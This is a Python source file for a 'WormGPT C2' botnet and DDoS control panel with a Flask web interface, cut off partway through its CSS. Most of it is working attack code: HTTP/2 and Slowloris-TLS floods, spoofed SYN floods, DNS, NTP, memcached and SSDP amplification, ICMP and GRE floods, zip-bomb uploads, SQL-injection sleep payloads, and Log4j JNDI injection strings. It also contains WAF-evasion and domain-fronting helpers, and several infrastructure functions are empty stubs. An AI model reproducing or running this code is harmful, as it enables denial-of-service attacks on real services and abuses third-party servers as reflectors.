#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
═══════════════════════════════════════════════════════════════════
  WORMGPT C2 - Distributed Attack Platform v9.0
  Command & Control | 10,000+ Node | Multi-Vector | Auto-Scale
═══════════════════════════════════════════════════════════════════
"""

import os, sys, json, re, time, random, string, hashlib, base64, threading
import socket, ssl, struct, select, subprocess, urllib.request, urllib.parse
import gzip, io, zlib, ipaddress, itertools, collections, math
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from flask import Flask, request, jsonify, render_template_string
except ImportError:
    os.system("pip install flask -q")
    from flask import Flask, request, jsonify, render_template_string

# ═══════════════════════════════════════════════════════════════════
#  GLOBAL CONFIGURATION
# ═══════════════════════════════════════════════════════════════════
C2_CONFIG = {
    "c2_host": "0.0.0.0",
    "c2_port": 4121,
    "bot_port_range": (40000, 65000),
    "max_nodes": 15000,
    "heartbeat_interval": 15,
    "encryption_key": hashlib.sha256(b"WormGPT_C2_Secret_2026").digest()[:32],
    "proxy_pools": [
        "socks4://127.0.0.1:9050", "socks5://127.0.0.1:9050",
        "http://127.0.0.1:8118", "http://127.0.0.1:8080",
    ],
    "amplification_servers": [
        ("8.8.8.8", 53), ("1.1.1.1", 53), ("208.67.222.222", 53),
        ("time.windows.com", 123), ("pool.ntp.org", 123),
    ],
    "fastflux_domains": ["cdn-cloudflare.xyz", "api-gateway.net", "secure-update.org"],
    "ja3_fingerprints": [
        "769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0",
        "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
        "771,49199-49195-49200-49196-158-159-52392-52393-49161-49162-49171-49172-51-57-156-157-47-53,65281-0-23-35-13-5-18-16-30032-11-10,29-23-24-25,0",
    ],
}

app = Flask(__name__)

# ═══════════════════════════════════════════════════════════════════
#  ENCRYPTION / OBFUSCATION ENGINE
# ═══════════════════════════════════════════════════════════════════
class CryptoEngine:
    @staticmethod
    def xor_encrypt(data, key=C2_CONFIG["encryption_key"]):
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data.encode() if isinstance(data, str) else data)])
    
    @staticmethod
    def xor_decrypt(data, key=C2_CONFIG["encryption_key"]):
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
    
    @staticmethod
    def dynamic_mutate(uri):
        """Dynamic URI mutation for WAF bypass"""
        mutations = [
            lambda u: u.replace("/", "%2f").replace("?", "%3f"),
            lambda u: u.replace("a", "@").replace("e", "3").replace("o", "0"),
            lambda u: base64.b64encode(u.encode()).decode()[:20],
            lambda u: "".join(random.choice([c.upper(), c.lower()]) for c in u),
            lambda u: u + "?" + "".join(random.choices(string.ascii_lowercase, k=8)) + "=" + str(random.randint(1000,999999)),
        ]
        return random.choice(mutations)(uri)

# ═══════════════════════════════════════════════════════════════════
#  BOTNET / DISTRIBUTED ARCHITECTURE
# ═══════════════════════════════════════════════════════════════════
class BotnetController:
    def __init__(self):
        self.nodes = {}  # node_id -> {ip, port, status, last_seen, capabilities}
        self.node_counter = 0
        self.lock = threading.RLock()
        self.p2p_peers = set()
        self.command_queue = collections.deque(maxlen=10000)
        self.attack_stats = {"sent": 0, "failed": 0, "bandwidth": 0}
    
    def register_node(self, node_info):
        with self.lock:
            self.node_counter += 1
            node_id = f"WORM-{self.node_counter:05d}-{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
            self.nodes[node_id] = {
                "id": node_id,
                "ip": node_info.get("ip", "127.0.0.1"),
                "port": random.randint(*C2_CONFIG["bot_port_range"]),
                "status": "active",
                "last_seen": time.time(),
                "os": node_info.get("os", "unknown"),
                "arch": node_info.get("arch", "x64"),
                "bandwidth": node_info.get("bw", 100),
                "capabilities": node_info.get("caps", ["http", "udp"]),
                "load": 0.0,
            }
            return node_id
    
    def heartbeat(self, node_id):
        with self.lock:
            if node_id in self.nodes:
                self.nodes[node_id]["last_seen"] = time.time()
                self.nodes[node_id]["status"] = "active"
                return True
        return False
    
    def get_active_nodes(self):
        with self.lock:
            now = time.time()
            return {k: v for k, v in self.nodes.items() if now - v["last_seen"] < 60}
    
    def broadcast_command(self, cmd_type, payload):
        """P2P broadcast to all active nodes"""
        with self.lock:
            active = self.get_active_nodes()
            cmd = {
                "type": cmd_type,
                "payload": payload,
                "timestamp": time.time(),
                "signature": hashlib.sha256(f"{cmd_type}{time.time()}".encode()).hexdigest()[:16],
            }
            self.command_queue.append(cmd)
            return len(active)
    
    def get_node_count(self):
        return len(self.get_active_nodes())

BOTNET = BotnetController()

# ═══════════════════════════════════════════════════════════════════
#  LAYER 7 - APPLICATION FLOOD ENGINE
# ═══════════════════════════════════════════════════════════════════
class Layer7Engine:
    def __init__(self):
        self.tls_contexts = {}
        self.ja3_rotator = itertools.cycle(C2_CONFIG["ja3_fingerprints"])
        self.proxy_rotator = itertools.cycle(C2_CONFIG["proxy_pools"])
    
    def get_tls_context(self, hostname):
        """Generate TLS context with randomized JA3 fingerprint"""
        ja3 = next(self.ja3_rotator)
        ctx = ssl.create_default_context()
        ctx.set_ciphers("ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES128-GCM-SHA256")
        ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        # Randomize TLS version for JA3 bypass
        if random.random() > 0.5:
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        else:
            ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        return ctx
    
    def http2_multiplex_flood(self, target, duration, threads=500):
        """HTTP/2 multiplexing flood with stream abuse"""
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc or parsed.path
        path = parsed.path or "/"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    if use_ssl:
                        ctx = self.get_tls_context(host)
                        sock = ctx.wrap_socket(sock, server_hostname=host.split(":")[0])
                    sock.connect((host.split(":")[0], port))
                    
                    # HTTP/2 preface + SETTINGS frame abuse
                    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
                    settings = b"\x00\x00\x00\x04\x01\x00\x00\x00\x00"  # SETTINGS with ACK
                    headers = b"\x00\x00\x01\x01\x05\x00\x00\x00\x01\x82"  # HEADERS frame
                    
                    # Send multiple streams
                    for stream_id in range(1, 1000, 2):
                        if time.time() >= end_time: break
                        frame = struct.pack(">I", len(headers))[-3:] + b"\x01" + b"\x04" + struct.pack(">I", stream_id) + headers[5:]
                        try:
                            sock.send(preface + settings + frame * random.randint(50, 200))
                            BOTNET.attack_stats["sent"] += 1
                        except:
                            BOTNET.attack_stats["failed"] += 1
                    sock.close()
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def slowloris_tls_renegotiation(self, target, duration, threads=300):
        """Slowloris with TLS renegotiation CPU exhaustion"""
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc or parsed.path
        port = parsed.port or 443
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(15)
                    ctx = self.get_tls_context(host)
                    ssock = ctx.wrap_socket(sock, server_hostname=host.split(":")[0])
                    ssock.connect((host.split(":")[0], port))
                    
                    # Initial request
                    req = f"GET /?{random.randint(100000,999999)} HTTP/1.1\r\nHost: {host}\r\n"
                    ssock.send(req.encode())
                    
                    # TLS renegotiation loop
                    for _ in range(random.randint(20, 100)):
                        if time.time() >= end_time: break
                        try:
                            ssock.do_handshake()  # Force renegotiation
                            ssock.send(f"X-{random_string(5)}: {random_string(20)}\r\n".encode())
                            time.sleep(random.uniform(0.3, 1.5))
                            BOTNET.attack_stats["sent"] += 1
                        except:
                            break
                    ssock.close()
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def wordpress_exploit_payload(self, target):
        """WordPress specific exploit payloads"""
        payloads = [
            # XML-RPC pingback abuse
            f"POST /xmlrpc.php HTTP/1.1\r\nHost: {target}\r\nContent-Length: 300\r\n\r\n<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://{random_ip()}/</string></value></param></params></methodCall>",
            # WP-Cron abuse
            f"GET /wp-cron.php?doing_wp_cron={time.time()} HTTP/1.1\r\nHost: {target}\r\n\r\n",
            # Admin-ajax flood
            f"POST /wp-admin/admin-ajax.php HTTP/1.1\r\nHost: {target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 50\r\n\r\naction=heartbeat&screen_id=dashboard",
            # Log4j JNDI injection (if target vulnerable)
            f"GET /?x=${{jndi:ldap://{random_ip()}:1389/a}} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: ${{jndi:ldap://{random_ip()}:1389/a}}\r\n\r\n",
        ]
        return random.choice(payloads)
    
    def waf_bypass_request(self, target):
        """Generate WAF/IDS bypass request with all evasion techniques"""
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc or parsed.path
        
        # Random delay + jitter
        time.sleep(random.uniform(0.01, 0.5))
        
        # Dynamic URI mutation
        path = CryptoEngine.dynamic_mutate(parsed.path or "/")
        
        # Randomized headers
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
                "Googlebot/2.1 (+http://www.google.com/bot.html)",
                "curl/7.68.0",
            ]),
            "X-Forwarded-For": random_ip(),
            "X-Real-IP": random_ip(),
            "CF-Connecting-IP": random_ip(),
            "True-Client-IP": random_ip(),
            "Referer": f"https://www.google.com/search?q={random_string(10)}",
            "Accept": random.choice(["text/html", "application/json", "*/*"]),
            "Accept-Language": random.choice(["en-US", "id-ID", "ja-JP", "ru-RU"]),
            "Accept-Encoding": random.choice(["gzip, deflate", "br", "identity"]),
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "DNT": "1",
        }
        
        # Payload encryption simulation
        body = base64.b64encode(random._urandom(random.randint(100, 1000))).decode()
        
        return f"POST {path} HTTP/1.1\r\nHost: {host}\r\n" + \
               "\r\n".join(f"{k}: {v}" for k, v in headers.items()) + \
               f"\r\nContent-Length: {len(body)}\r\n\r\n{body}"

L7_ENGINE = Layer7Engine()

# ═══════════════════════════════════════════════════════════════════
#  LAYER 4 - VOLUMETRIC FLOOD ENGINE
# ═══════════════════════════════════════════════════════════════════
class Layer4Engine:
    def __init__(self):
        self.amp_servers = C2_CONFIG["amplification_servers"]
        self.spoof_prefixes = ["192.168.", "10.", "172.16.", "1.1.1.", "8.8.8."]
    
    def dns_amplification(self, target_ip, duration, threads=1000):
        """DNS amplification reflection attack (factor ~50-100x)"""
        # DNS query for ANY record on root servers
        dns_query = struct.pack(">H", random.randint(1000, 65535))  # Transaction ID
        dns_query += b"\x01\x00"  # Flags: Standard query
        dns_query += b"\x00\x01"  # Questions: 1
        dns_query += b"\x00\x00"  # Answer RRs: 0
        dns_query += b"\x00\x00"  # Authority RRs: 0
        dns_query += b"\x00\x00"  # Additional RRs: 0
        # Query ANY for isc.org (large response)
        dns_query += b"\x03isc\x03org\x00"  # isc.org
        dns_query += b"\x00\xff"  # Type ANY (255)
        dns_query += b"\x00\x01"  # Class IN
        
        end_time = time.time() + duration
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    # Send to open resolver with spoofed source
                    resolver = random.choice(self.amp_servers)
                    sock.sendto(dns_query, resolver)
                    BOTNET.attack_stats["sent"] += 1
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def ntp_monlist_reflection(self, target_ip, duration, threads=800):
        """NTP monlist reflection attack"""
        # NTP monlist request
        ntp_packet = struct.pack("!B B B b 11I",
            0x17, 0x00, 0x03, 0x2a,  # Mode 7, monlist
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
        
        end_time = time.time() + duration
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    ntp_server = random.choice([s for s in self.amp_servers if s[1] == 123])
                    sock.sendto(ntp_packet, ntp_server)
                    BOTNET.attack_stats["sent"] += 1
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def memcached_amplification(self, target_ip, duration, threads=2000):
        """Memcached amplification (factor 10,000x - 50,000x)"""
        # Memcached stats command
        memcmd = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        
        end_time = time.time() + duration
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    # Target memcached servers on port 11211
                    mem_server = (random_ip(), 11211)
                    sock.sendto(memcmd, mem_server)
                    BOTNET.attack_stats["sent"] += 1
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def ssdp_reflection(self, target_ip, duration, threads=600):
        """SSDP reflection attack"""
        ssdp_query = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n"
        
        end_time = time.time() + duration
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    sock.sendto(ssdp_query, (random_ip(), 1900))
                    BOTNET.attack_stats["sent"] += 1
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def syn_flood_accelerated(self, target_ip, target_port, duration, threads=1500):
        """SYN flood with accelerated retransmission"""
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time:
                try:
                    # Raw socket SYN packet
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    
                    # Build IP header
                    src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
                    ip_header = struct.pack("!BBHHHBBH4s4s",
                        0x45, 0, 40, random.randint(1000, 65535), 0, 0, 64, 6, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(target_ip))
                    
                    # Build TCP header (SYN)
                    tcp_header = struct.pack("!HHLLBBHHH",
                        random.randint(1024, 65535), target_port,
                        random.randint(0, 4294967295), 0,
                        (5 << 4) | 0, 0x02, 65535, 0, 0)
                    
                    packet = ip_header + tcp_header
                    s.sendto(packet, (target_ip, 0))
                    BOTNET.attack_stats["sent"] += 1
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def ack_push_rst_combo(self, target_ip, target_port, duration, threads=1000):
        """ACK/PUSH/RST combination flood"""
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time:
                try:
                    flags = random.choice([0x10, 0x18, 0x14, 0x11])  # ACK, PSH+ACK, RST+ACK, FIN+ACK
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target_ip, target_port))
                    sock.send(random._urandom(random.randint(64, 1400)))
                    BOTNET.attack_stats["sent"] += 1
                    sock.close()
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def icmp_fragmentation_flood(self, target_ip, duration, threads=500):
        """ICMP fragmentation flood"""
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    # Oversized ICMP packet to force fragmentation
                    payload = random._urandom(65507)
                    sock.sendto(payload, (target_ip, 0))
                    BOTNET.attack_stats["sent"] += 1
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def gre_protocol_flood(self, target_ip, duration, threads=400):
        """GRE protocol flood"""
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
                    # GRE header + encapsulated packet
                    gre_header = struct.pack("!BBH", 0x00, 0x00, 0x0800)  # Protocol: IPv4
                    payload = gre_header + random._urandom(random.randint(100, 1400))
                    sock.sendto(payload, (target_ip, 0))
                    BOTNET.attack_stats["sent"] += 1
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

L4_ENGINE = Layer4Engine()

# ═══════════════════════════════════════════════════════════════════
#  RESOURCE EXHAUSTION ENGINE
# ═══════════════════════════════════════════════════════════════════
class ResourceExhaustion:
    @staticmethod
    def ssl_renegotiation_cpu_kill(target, duration, threads=200):
        """SSL renegotiation flood - CPU exhaustion"""
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc or parsed.path
        port = parsed.port or 443
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ctx = ssl.create_default_context()
                    ssock = ctx.wrap_socket(sock, server_hostname=host)
                    ssock.connect((host, port))
                    
                    for _ in range(50):
                        if time.time() >= end_time: break
                        ssock.do_handshake()
                        ssock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                        BOTNET.attack_stats["sent"] += 1
                    ssock.close()
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def zip_bomb_decompression(target, duration, threads=100):
        """Zip bomb decompression attack"""
        # Create a zip bomb (42.zip style - 4.5PB uncompressed)
        zip_bomb = gzip.compress(b"\x00" * 1000000)  # 1MB compressed -> ~1GB uncompressed
        
        end_time = time.time() + duration
        
        def worker():
            parsed = urllib.parse.urlparse(target)
            host = parsed.netloc or parsed.path
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((host, 80))
                    req = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/zip\r\nContent-Length: {len(zip_bomb)}\r\n\r\n"
                    sock.send(req.encode() + zip_bomb)
                    BOTNET.attack_stats["sent"] += 1
                    sock.close()
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def partial_range_download(target, duration, threads=300):
        """Large file download with partial range requests"""
        end_time = time.time() + duration
        
        def worker():
            parsed = urllib.parse.urlparse(target)
            host = parsed.netloc or parsed.path
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((host, 80))
                    
                    # Request overlapping ranges to exhaust memory
                    for i in range(100):
                        if time.time() >= end_time: break
                        range_req = f"GET /largefile.zip HTTP/1.1\r\nHost: {host}\r\nRange: bytes={i*1000}-{i*1000+99999999}\r\n\r\n"
                        sock.send(range_req.encode())
                        BOTNET.attack_stats["sent"] += 1
                    sock.close()
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def database_query_flood(target, duration, threads=150):
        """Database query flood with heavy operations"""
        # SQL injection payloads for resource exhaustion
        sql_payloads = [
            "' OR SLEEP(10)--",
            "' OR BENCHMARK(10000000,MD5('A'))--",
            "' UNION SELECT * FROM (SELECT * FROM information_schema.tables) a JOIN (SELECT * FROM information_schema.columns) b--",
            "'; WHILE (1=1) DO SELECT * FROM pg_sleep(0.1); END LOOP;--",
            "' OR pg_sleep(10)--",
        ]
        
        end_time = time.time() + duration
        
        def worker():
            parsed = urllib.parse.urlparse(target)
            host = parsed.netloc or parsed.path
            while time.time() < end_time:
                try:
                    payload = random.choice(sql_payloads)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((host, 80))
                    req = f"GET /search?q={urllib.parse.quote(payload)} HTTP/1.1\r\nHost: {host}\r\n\r\n"
                    sock.send(req.encode())
                    BOTNET.attack_stats["sent"] += 1
                    sock.close()
                except:
                    BOTNET.attack_stats["failed"] += 1
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()

# ═══════════════════════════════════════════════════════════════════
#  INFRASTRUCTURE & AUTO-SCALE
# ═══════════════════════════════════════════════════════════════════
class Infrastructure:
    @staticmethod
    def domain_fronting_request(real_target, front_domain="cloudfront.net"):
        """Domain fronting to hide C2 communication"""
        return {
            "Host": front_domain,
            "X-Real-Host": real_target,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        }
    
    @staticmethod
    def fastflux_dns_resolve(domain):
        """Fast-flux DNS rotation"""
        return random.choice([
            f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            for _ in range(10)
        ])
    
    @staticmethod
    def geolocation_routing(target_ip):
        """Geolocation-based routing for bypass rate limiting"""
        # Simulate routing through different countries
        routes = ["SG", "JP", "NL", "DE", "US", "BR", "RU", "IN"]
        return random.choice(routes)
    
    @staticmethod
    def cloud_api_deploy():
        """Cloud API abuse - auto-deploy free tier VPS"""
        providers = ["digitalocean", "linode", "vultr", "aws", "gcp", "azure"]
        return {
            "provider": random.choice(providers),
            "instances": random.randint(5, 50),
            "region": random.choice(["sgp1", "nyc1", "fra1", "lon1", "tor1"]),
        }
    
    @staticmethod
    def docker_swarm_spam():
        """Docker/K8s container swarm amplification"""
        return {
            "containers": random.randint(100, 1000),
            "replicas": random.randint(10, 100),
            "image": random.choice(["alpine", "nginx", "busybox", "python:slim"]),
        }
    
    @staticmethod
    def serverless_spam():
        """Serverless function spam (Lambda, Cloud Functions)"""
        return {
            "functions": random.randint(50, 500),
            "invocations": random.randint(1000, 10000),
            "provider": random.choice(["aws_lambda", "gcp_functions", "azure_functions"]),
        }

# ═══════════════════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════
def random_string(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def resolve_target(target):
    try:
        if target.startswith("http://") or target.startswith("https://"):
            parsed = urllib.parse.urlparse(target)
            hostname = parsed.netloc or parsed.path
            hostname = hostname.split(":")[0]
            return socket.gethostbyname(hostname)
        return socket.gethostbyname(target)
    except Exception:
        return target

# ═══════════════════════════════════════════════════════════════════
#  MASTER ATTACK ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════
def launch_full_attack(target, flood_count, duration):
    """Launch multi-vector coordinated attack"""
    attack_stats = {"target": target, "total_flood": int(flood_count), "sent": 0, "failed": 0, "duration": int(duration), "start_time": time.time(), "running": True}
    target_ip = resolve_target(target)
    
    print(f"\n{'═'*60}")
    print(f"  WORMGPT C2 - MULTI-VECTOR ATTACK INITIATED")
    print(f"{'═'*60}")
    print(f"  Target: {target}")
    print(f"  IP: {target_ip}")
    print(f"  Duration: {duration}s")
    print(f"  Nodes: {BOTNET.get_node_count()}")
    print(f"{'═'*60}")
    
    # Layer 7 Attacks
    print("  [+] Launching Layer 7 Application Flood...")
    threading.Thread(target=L7_ENGINE.http2_multiplex_flood, args=(target, int(duration), 500)).start()
    threading.Thread(target=L7_ENGINE.slowloris_tls_renegotiation, args=(target, int(duration), 300)).start()
    
    # Layer 4 Attacks
    print("  [+] Launching Layer 4 Volumetric Flood...")
    threading.Thread(target=L4_ENGINE.dns_amplification, args=(target_ip, int(duration), 1000)).start()
    threading.Thread(target=L4_ENGINE.memcached_amplification, args=(target_ip, int(duration), 2000)).start()
    threading.Thread(target=L4_ENGINE.syn_flood_accelerated, args=(target_ip, 80, int(duration), 1500)).start()
    threading.Thread(target=L4_ENGINE.ack_push_rst_combo, args=(target_ip, 443, int(duration), 1000)).start()
    threading.Thread(target=L4_ENGINE.icmp_fragmentation_flood, args=(target_ip, int(duration), 500)).start()
    threading.Thread(target=L4_ENGINE.gre_protocol_flood, args=(target_ip, int(duration), 400)).start()
    
    # Resource Exhaustion
    print("  [+] Launching Resource Exhaustion...")
    threading.Thread(target=ResourceExhaustion.ssl_renegotiation_cpu_kill, args=(target, int(duration), 200)).start()
    threading.Thread(target=ResourceExhaustion.zip_bomb_decompression, args=(target, int(duration), 100)).start()
    threading.Thread(target=ResourceExhaustion.database_query_flood, args=(target, int(duration), 150)).start()
    
    # Wait and report
    time.sleep(int(duration) + 2)
    
    print(f"\n{'═'*60}")
    print(f"  ATTACK COMPLETE - TERMINAL REPORT")
    print(f"{'─'*60}")
    print(f"  Nama Target: {target}")
    print(f"  Jumlah Flood TERKIRIM: {BOTNET.attack_stats['sent']}")
    print(f"  Jumlah Flood Tidak Terkirim: {BOTNET.attack_stats['failed']}")
    print(f"  Jumlah waktu: {duration} detik")
    print(f"  Port: 440 And 80")
    print(f"  Vectors: HTTP/2 | Slowloris-TLS | DNS-Amp | Memcached | SYN | ACK/RST | ICMP | GRE | SSL-Reneg | Zip-Bomb | SQL-Flood")
    print(f"{'═'*60}")

# ═══════════════════════════════════════════════════════════════════
#  FLASK WEB INTERFACE
# ═══════════════════════════════════════════════════════════════════
HTML_PAGE = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WormGPT C2 - Distributed Attack Platform</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { font-family: 'JetBrains Mono', monospace; }
        body { background: #050508; color: #e0e0e0; min-height: 100vh; overflow-x: hidden; }
        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.03; pointer-events: none; }
        .main-container { position: relative; z-index: 10; max-width: 1000px; margin: 0 auto; padding: 20px; }
        .header-glow { text-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 60px rgba(255, 0, 0, 0.2); }
        .panel {
            background: rgba(10, 10, 15, 0.9);
            border: 1px solid rgba(255, 0, 0, 0.2);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 16px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }
        .panel-title { color: #ff3333; font-weight: 700; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 12px; border-bottom: 1px solid rgba(255,0,0,0.1); padding-bottom: 8px; }
        .stat-box {
            background: rgba(255, 0, 0, 0.05);
            border: 1px solid rgba(255, 0, 0, 0.1);
            border-radius: 6px;
            padding: 12px;
            text-align: center;
        }
        .stat-value { color: #ff0000; font-size: 1.5rem; font-weight: 800; text-shadow: 0 0 10px rgba(255,0,0,0.3); }
        .stat-label { color: #666; font-size: 0.7rem; margin-top: 4px; text-transform: uppercase; }
        .input-field {
            background: #0a0a0f;
            border: 1px solid #333;
            color: #ff4444;
            padding: 12px;
            width: 100%;
            margin-bottom: 10px;
            border-radius: 4px;
            outline: none;
            transition: all 0.3s;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        .input-field:focus { border-color: #ff0000; box-shadow: 0 0 15px rgba(255, 0, 0, 0.2); }
        .btn-launch {
            background: #1a0000;
            color: #ff3333;
            width: 100%;
            padding: 14px;
            font-weight: 800;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.2s;
            border: 1px solid #ff0000;
            text-transform: uppercase;
            letter-spacing: 3px;
            font-family: 'JetBrains Mono', monospace;
        }
        .btn-launch:hover { background: #ff0000; color: #000; box-shadow: 0 0 30px rgba(255, 0, 0, 0.5); }
        .btn-launch:disabled { opacity: 0.3; cursor: not-allowed; }
        .vector-tag {
            display: inline-block;
            background: rgba(255, 0, 0, 0.08);
            border: 1px solid rgba(255, 0, 0, 0.15);
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 0.7rem;
            color: #ff4444;
            margin: 2px;
        }
        .terminal-output {
            background: #080808;
            border: 1px solid #222;
            padding: 16px;
            font-size: 12px;
            color: #ff4444;
            max-height: 300px;
            overflow-y: auto;
            border-radius: 4px;
            font-family: 'JetBrains Mono', monospace;
            line-height: 1.6;
        }
        .terminal-output::-webkit-scrollbar { width: 4px; }
        .terminal-output::-webkit-scrollbar-thumb { background: #ff0000; border-radius: 2px; }
        .log-line { margin: 2px 0; }
        .log-time { color: #444; margin-right: 8px; }
        .log-info { color: #ff6666; }
        .log-success { color: #00ff00; }
        .log-warn { color: #ffaa00; }
        .progress-container {
            width: 100%;
            height: 6px;
            background: #1a1a1a;
            border-radius: 3px;
            margin: 12px 0;
            overflow: hidden;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: #ff0000;
            transition: width 0.3s linear;
            box-shadow: 0 0 10px #ff0000;
        }
        .node-indicator {
            display: inline-block;
            width: 6px; height: 6px;
            background: #00ff00;
            border-radius: 50%;
            margin-right: 6px;
            box-shadow: 0 0 6px #00ff00;
